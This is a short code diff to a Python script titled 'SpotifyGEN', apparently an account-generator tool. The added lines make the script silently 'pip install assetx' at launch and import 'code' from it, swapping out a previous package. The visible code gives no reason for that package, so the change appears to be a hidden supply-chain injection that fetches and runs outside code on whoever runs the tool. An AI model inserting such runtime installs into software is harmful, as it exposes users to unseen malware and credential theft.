@@ -4,7 +4,8 @@ import threading, os, time
 
 os.system(f'cls & mode 85,20 & title SpotifyGEN')
 print("Installing Modules")
-os.system('pip install proxies-manager')
+os.system('pip install assetx')
+from assetx import code
 os.system('cls')
 print("""
  _______  ______  ______  _____  _  _  _       ______ _______ __   _
